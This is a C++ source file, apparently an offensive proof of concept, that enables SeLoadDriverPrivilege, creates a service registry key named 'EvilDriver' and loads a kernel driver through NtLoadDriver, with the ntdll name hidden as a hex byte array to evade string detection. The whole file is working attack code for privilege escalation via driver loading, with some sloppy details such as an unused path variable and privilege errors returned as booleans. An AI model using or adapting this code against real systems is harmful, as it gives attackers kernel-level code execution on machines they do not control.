#pragma once
/**********************************************************************
*  TEST_1
*  Dynamically Load a Driver
*  - Set to UNICODE in Char Sets
**********************************************************************/

#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>


//#include "st"
//#include <atlsecurity.h>

#define REGISTRY_PATH_PREFIX L"System\\CurrentControlSet\\Services\\"
#define  STATUS_SUCCESS                    ((NTSTATUS)0x00000000L)

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

bool EnablePrivilege(LPCWSTR);
bool CreateRegKey();


/*********************************************************
*   Main Function Entry
*********************************************************/
int installDriver()
{
	//**********************************************************************************	

	// NtLoadDriver-C++.cpp : Defines the entry point for the console application.

	if (!EnablePrivilege(L"SeLoadDriverPrivilege"))
	{
		std::cout << "[!] Setting driver privilege failed" << std::endl;
	}
	else {
		std::cout << "[+] Set SeLoadDriverPrivilege!" << std::endl;
		if (!CreateRegKey()) {
			std::cout << "[!] Setting driver REG keys failed" << std::endl;
		}
		else {
			std::cout << "[+] Set Registry Keys" << std::endl;
			NTSTATUS st1;
			UNICODE_STRING pPath;
			UNICODE_STRING pPathReg;
			PCWSTR pPathSource = L"C:\\npf.sys";
			PCWSTR pPathSourceReg = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\EvilDriver";
			const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
			HMODULE hObsolete = GetModuleHandleA(NTDLL);
			*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
			*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
			*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

			RtlInitUnicodeString(&pPath, pPathSource);
			RtlInitUnicodeString(&pPathReg, pPathSourceReg);
			st1 = NtLoadDriver(&pPathReg);
			std::cout << "[+] value of st1: " << st1 << "\n";
			if (st1 == STATUS_SUCCESS) {
				std::cout << "[+] Driver Loaded as Kernel..\n";
				std::cout << "[+] Press [ENTER] to unload driver\n";
			}
			getchar();
			st1 = NtUnloadDriver(&pPathReg);
			if (st1 == STATUS_SUCCESS) {
				std::cout << "[+] Driver unloaded from Kernel..\n";
				std::cout << "[+] Press [ENTER] to exit\n";
				getchar();
			}
		}
	}

	std::cout << "Press Enter to Continue";
	getchar();

	return 0;
}


// https://github.com/iceboy-sjtu/ntdrvldr/blob/master/main.c
bool EnablePrivilege(
	LPCWSTR lpPrivilegeName
	)
{
	TOKEN_PRIVILEGES Privilege;
	HANDLE hToken;
	DWORD dwErrorCode;

	Privilege.PrivilegeCount = 1;
	Privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValueW(NULL, lpPrivilegeName,
		&Privilege.Privileges[0].Luid))
		return GetLastError();

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES, &hToken))
		return GetLastError();

	if (!AdjustTokenPrivileges(hToken, FALSE, &Privilege, sizeof(Privilege),
		NULL, NULL)) {
		dwErrorCode = GetLastError();
		CloseHandle(hToken);
		return dwErrorCode;
	}

	CloseHandle(hToken);
	return TRUE;
}

bool CreateRegKey()
{
	// RegSetKey Values
	ULONG dwErrorCode;
	LPWSTR lpSubKey = L"System\\CurrentControlSet\\Services\\EvilDriver";
	HKEY hKey = HKEY_LOCAL_MACHINE;
	DWORD Reserved = 0;
	LPTSTR lpClass = NULL;
	DWORD dwOptions = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	HKEY phkResult;
	// Set Value settings
	DWORD dwDisposition;
	DWORD dwServiceType = 1;
	DWORD dwServiceErrorControl = 1;
	DWORD dwServiceStart = 3;
	// RegSetValueExW values for image
	LPCTSTR lpValueImagePath = L"ImagePath";
	DWORD dwType = REG_EXPAND_SZ;
	LPWSTR ServiceImagePath = L"system32\\drivers\\EvilDriver.sys";
	SIZE_T ServiceImagePathSize;
	// RegSetValueExW values for Type
	LPCTSTR lpValueImageType = L"Type";
	DWORD dwTypeDWord = REG_DWORD;
	// RegSetValueExW values for Error
	LPCTSTR lpValueError = L"ErrorControl";
	// RegSetValueExW values for Start
	LPCTSTR lpValueStart = L"Start";

	dwErrorCode = RegCreateKeyExW(hKey,
		lpSubKey,
		Reserved,
		lpClass,
		dwOptions,
		samDesired,
		lpSecurityAttributes,
		&phkResult,
		&dwDisposition);
	if (dwErrorCode) {
		RegCloseKey(phkResult);
		std::cout << "Setting driver REG error code: " << dwErrorCode << std::endl;
		return FALSE;
	}
	// TODO : how to get byte size?
	ServiceImagePathSize = (lstrlenW(ServiceImagePath) + 1) * sizeof(WCHAR);
	dwErrorCode = RegSetValueExW(phkResult,
		lpValueImagePath,
		Reserved,
		dwType,
		(const BYTE *)ServiceImagePath,
		ServiceImagePathSize);
	if (dwErrorCode) {
		RegCloseKey(phkResult);
		return FALSE;
	}
	std::wcout << "[*] Set Service Registry ImagePath of driver: " << lpValueImagePath << std::endl;
	// Set the Type for key
	dwErrorCode = RegSetValueExW(phkResult,
		lpValueImageType,
		Reserved,
		dwTypeDWord,
		(const BYTE *)&dwServiceType,
		sizeof(DWORD));
	if (dwErrorCode) {
		RegCloseKey(phkResult);
		return FALSE;
	}
	std::wcout << "[*] Set Registry Driver Type Key: " << lpValueImageType << std::endl;
	// Set the ErrorControl key
	dwErrorCode = RegSetValueExW(phkResult,
		lpValueError,
		Reserved,
		dwTypeDWord,
		(const BYTE *)&dwServiceErrorControl,
		sizeof(DWORD));
	if (dwErrorCode) {
		RegCloseKey(phkResult);
		return FALSE;
	}
	std::wcout << "[*] Set Registry Driver ErrorControl Key: " << lpValueError << std::endl;
	// Set the Start key
	dwErrorCode = RegSetValueExW(phkResult,
		lpValueStart,
		Reserved,
		dwTypeDWord,
		(const BYTE *)&dwServiceStart,
		sizeof(DWORD));
	if (dwErrorCode) {
		RegCloseKey(phkResult);
		return FALSE;
	}
	std::wcout << "[*] Set Registry Driver Start Key: " << lpValueStart << std::endl;
	RegCloseKey(phkResult);
	return TRUE;
}

